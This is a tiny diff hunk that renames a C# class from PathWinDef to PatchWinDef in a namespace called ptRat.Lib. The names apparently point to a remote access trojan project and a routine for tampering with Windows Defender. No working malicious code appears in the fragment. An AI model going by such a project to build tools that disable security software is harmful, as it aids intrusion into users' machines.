@@ -8,9 +8,9 @@ using Microsoft.Win32;
 
 namespace ptRat.Lib
 {
-    internal class PathWinDef
+    internal class PatchWinDef
     {
-        public PathWinDef()
+        public PatchWinDef()
         {
             try
             {
